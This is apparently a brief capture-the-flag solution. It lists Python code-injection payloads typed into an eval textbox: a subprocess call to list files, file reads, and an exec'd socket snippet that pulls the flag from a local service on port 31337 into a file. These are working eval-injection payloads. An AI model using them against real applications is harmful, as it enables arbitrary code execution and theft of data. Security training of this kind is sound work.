# Solution

Type this in eval textbox:

* \_\_import\_\_("subprocess").check_output(["ls"])  # find "interesting" file

* open("very_long_and_complex_file_name").read()  # read "interesting" file

* exec("""import socket as s;p=s.socket(s.AF_INET, s.SOCK_DGRAM);p.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);p.bind(("localhost", 0));p.sendto(b"", ("localhost", 31337));f=open("file_name", "wb");f.write((p.recvfrom(1024))[0]);f.close()""")  # write flag to "file_name"

* open("file_name").read()  # read flag from "file_name"
